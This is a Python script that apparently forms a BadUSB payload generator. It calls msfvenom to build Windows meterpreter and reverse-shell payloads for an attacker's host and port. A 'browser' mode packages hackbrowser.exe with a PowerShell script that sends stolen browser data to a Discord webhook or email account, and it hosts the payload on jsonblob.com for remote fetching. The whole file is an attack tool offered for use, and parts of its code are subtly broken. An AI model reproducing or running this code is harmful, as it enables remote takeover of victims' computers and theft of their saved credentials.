#!/usr/bin/env python3
from subprocess import call, check_call
from os.path import exists
from os import mkdir
from shutil import copyfile
from requests import request, get, post, put
from pathlib import Path

banner = """\033[94m
 _______                 __ __    __  ______  _______         ______           __   __             
|       \               |  |  \  |  \/      \|       \       /      \         |  \ |  \            
| $$$$$$$\ ______   ____| $| $$  | $|  $$$$$$| $$$$$$$\     |  $$$$$$\__    __ \$$_| $$_    ______ 
| $$__/ $$|      \ /      $| $$  | $| $$___\$| $$__/ $$_____| $$___\$|  \  |  |  |   $$ \  /      \\
| $$    $$ \$$$$$$|  $$$$$$| $$  | $$\$$    \| $$    $|      \$$    \| $$  | $| $$\$$$$$$ |  $$$$$$\\
| $$$$$$$\/      $| $$  | $| $$  | $$_\$$$$$$| $$$$$$$\\\$$$$$_\$$$$$$| $$  | $| $$ | $$ __| $$    $$\\
| $$__/ $|  $$$$$$| $$__| $| $$__/ $|  \__| $| $$__/ $$     |  \__| $| $$__/ $| $$ | $$|  | $$$$$$$$
| $$    $$\$$    $$\$$    $$\$$    $$\$$    $| $$    $$      \$$    $$\$$    $| $$  \$$  $$\$$     \\
 \$$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$  \$$$$$$ \$$$$$$$        \$$$$$$  \$$$$$$ \$$   \$$$$  \$$$$$$$ \033[0m
"""

def generate_meterpreter(payload_path, LHOST, LPORT):
    """
    Generates a meterpreter payload
    """
    try:
        call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=" + LHOST, "LPORT=" + LPORT, "-f", "psh", "-o", payload_path])
    except FileNotFoundError or FileExistsError:
        print("[!] Could not find msfvenom. Please make sure it is installed and in your PATH!")
        exit(1)


def generate_shell(payload_path, LHOST, LPORT):
    """
    Generates a shell payload
    """
    try:
        call(["msfvenom", "-p", "windows/shell/reverse_tcp", "LHOST=" + LHOST, "LPORT=" + LPORT, "-f", "psh", "-o", payload_path])
    except FileNotFoundError or FileExistsError:
        print("[!] Could not find msfvenom. Please make sure it is installed and in your PATH!")
        exit(1)

def generate_browser():
    """
    Generates a browser payload
    """

    payload_path = get_payload_path("browser")
    send_method = get_payload_send_method()

    if send_method == "webhook":
        webhook = get_webhook()
    elif send_method == "email":
        email, password = get_email()
    else:
        print("[!] Invalid send method")
        exit(1)

    if payload_path == "payloads/browser":
        if not exists("payloads"):
            try:
                Path("payloads").mkdir()
            except FileExistsError:
                pass

   
        if not exists(payload_path):
            try:
                Path(payload_path).mkdir()
            except FileExistsError:
                pass
    else:
        part_of_path = ""
        path_parts = Path(path).parts
        for part in path_parts:
            part_of_path += part + "/"
            if not exists(part_of_path):
                mkdir(part_of_path)

    if not payload_path.endswith("/"):
        payload_path += "/"

    copyfile("templates/browser/hackbrowser.exe", payload_path + "hackbrowser.exe")
    if send_method == "webhook":
        copyfile("templates/browser/payload_webhook.ps1", payload_path + "payload.ps1")
    else:
        copyfile("templates/browser/payload_email.ps1", payload_path + "payload.ps1")
    copyfile("templates/browser/inject.txt", payload_path + "inject.txt")

    f = open(payload_path + "payload.ps1", "r")
    content = f.read()
    f.close()
    f = open(payload_path + "payload.ps1", "w")
    if send_method == "webhook":
        content = content.replace("WEBHOOK", webhook)
        f.write(content)
    else:
        f.write(content.replace("MAIL_ADDRESS", email).replace("MAIL_PWD", password).replace("MAIL_TO", email))
    f.truncate()
    f.close()

    payload_link = create_payload_link()
    
    f = open(payload_path + "inject.txt", "r")
    content = f.read()
    f.close()
    f = open(payload_path + "inject.txt", "w")
    f.write(content.replace("PAYLOAD_LINK", payload_link))
    f.truncate()
    f.close()

    f = open(payload_path + "payload.ps1", "r")
    content = f.read()
    put(payload_link, data=content, headers={"Content-Type": "application/json", "Accept": "application/json"}, json={"content": content})
    f.close()

    print("[+] Payload generated at: " + payload_path)
    print("[+] Payload link: " + payload_link)

def generate_payload(payload_path="payload", payload_type="browser", LHOST=None, LPORT=None):
    """
    Generates a payload based on the payload_type
    """

    payload_type = get_payload_type()

    if payload_type == "meterpreter":
        check_msfvenom()
        LHOST = get_LHOST()
        LPORT = get_LPORT()
        generate_meterpreter(payload_path, LHOST, LPORT)
    elif payload_type == "shell":
        LHOST = get_LHOST()
        LPORT = get_LPORT()
        check_msfvenom()
        generate_shell(payload_path, LHOST, LPORT)
    elif payload_type == "browser":
        generate_browser()
    else:
        print("[!] Invalid payload type")
        exit(1)

def get_payload_path(payload_type):
    while True:
        payload_path = input("[?] Enter the path to the payload: (default:payloads/payload_type) ")
        if payload_path == "":
            payload_path = "payloads/" + payload_type
        break
    return payload_path


def get_payload_type():
    while True:
        payload_type = input("[?] What type of payload do you want to generate? (meterpreter, shell, browser): ").lower()
        if payload_type in ["meterpreter", "shell", "browser"]:
            break
        else:
            print("[!] Invalid payload type")

    return payload_type

def get_payload_send_method():
    while True:
        payload_send_method = input("[?] How do you want to send the results? (webhook, email): ").lower()
        if payload_send_method in ["webhook", "email"]:
            break
        else:
            print("[!] Invalid result send method")

    return payload_send_method

def get_webhook():
    while True:
        webhook = input("[?] Enter the webhook URL: ")
        if (
                webhook.startswith("https://discordapp.com/api/webhooks/") or 
                webhook.startswith("https://discord.com/api/webhooks/") or 
                webhook.startswith("https://canary.discordapp.com/api/webhooks/") or 
                webhook.startswith("https://canary.discord.com/api/webhooks/")
            ):
            break
        else:
            print("[!] Invalid webhook URL")

    return webhook


def get_email():
    print("[!] Using emails as a send method, you will need to enable insecure applications in your email provider.")
    while True:
        email = input("[?] Enter the email address: ")
        if "@" in email:
            break
        else:
            print("[!] Invalid email address")

        password = input("[?] Enter the password: ")

    return email, password

def get_LHOST():
    while True:
        LHOST = input("[?] Enter the LHOST: ")
        if "." in LHOST:
            break
        else:
            print("[!] Invalid LHOST")

    return LHOST

def get_LPORT():
    while True:
        LPORT = input("[?] Enter the LPORT: ")
        try:
            int(LPORT)
            break
        except ValueError:
            print("[!] Invalid LPORT")

    return LPORT

def get_payload_link():
    gen_payload_link = input("[?] Do you want to generate a link to the payload? (y/n): ")
    if gen_payload_link != "n":
        payload_link = create_payload_link()
    else:
        while True:
            payload_link = input("[?] Enter the link to the payload: ")
            if payload_link.startswith("https://") or payload_link.startswith("http://"):
                break
            else:
                print("[!] Invalid link")

    return payload_link

def create_payload_link():
    """
    Creates a link to the payload
    """
    # turn this curl request into a python request : # curl -i -X "POST" -d '{"json":["format"]}' -H "Content-Type: application/json" -H "Accept: application/json" https://jsonblob.com/api/jsonBlob
    post_request = post("https://jsonblob.com/api/jsonBlob", data='{"json": ["format"]}', headers={"Content-Type": "application/json", "Accept": "application/json"}) # thanks you copilot for the help with this one :D
    payload_link = post_request.headers["location"]
    payload_link = payload_link.replace("http", "https")

    return payload_link

def PrintBanner():
    print("\nDeveloped by GamehunterKaan. (https://pwnspot.com)")
    print("─" * 100)
    print(banner.center(100))
    print("─" * 100)
    print("I am not responsible if you are doing something illegal using this program! \n")

def check_msfvenom():
    try:
        call(["msfvenom"])
        return
    except FileNotFoundError:
        print("[!] Could not find msfvenom. Please make sure it is installed and in your PATH!")
    
    InstallMetasploit = input("[?] Do you want to install msfvenom? (y/n): ").lower()
    if InstallMetasploit == "n":
        return
    
    try:
        call(["sudo", "apt-get", "install", "metasploit-framework", "-y"], stderr=STDOUT)
        return
    except Exception as e:
        print("[!] Could not install metasploit using apt-get! Installing using nightly installer...")
    try:
        #split this command into a call command curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
        #nice job copilot, my only friend! :,>
        call(["curl", "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb", ">", "msfinstall"])
        call(["chmod", "755", "msfinstall"])
        call(["sudo", "./msfinstall"])
        return
    except Exception as e:
        print("[!] Could not install metasploit using nightly installer!")
        print("[!] Please install metasploit manually and try again!")
        print("[!] Error: " + str(e))
        exit(1)

def main():
    """
    Main function
    """
    PrintBanner()
    generate_payload()

if __name__ == "__main__":
    main()
    exit(0)